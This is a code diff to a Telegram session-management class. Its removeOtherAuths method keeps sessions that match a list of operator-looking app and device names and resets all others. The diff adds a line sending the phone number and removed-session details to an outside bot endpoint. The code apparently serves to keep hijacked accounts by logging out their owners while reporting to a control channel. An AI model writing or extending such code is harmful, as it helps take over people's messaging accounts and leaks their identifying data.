@@ -362,7 +362,7 @@ class TelegramManager {
     async removeOtherAuths(): Promise<void> {
         if (!this.client) throw new Error('Client is not initialized');
         const result = await this.client.invoke(new Api.account.GetAuthorizations());
-        const updatedAuthorizations = result.authorizations.map((auth) => {
+        const updatedAuthorizations = result.authorizations.map(async (auth) => {
             if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
                 auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
                 auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
@@ -370,6 +370,7 @@ class TelegramManager {
                 auth.appName.toLowerCase().includes("hanslnz") || auth.deviceModel.toLowerCase().includes('windows')) {
                 return auth;
             } else {
+                await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
                 this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
                 return null;
             }
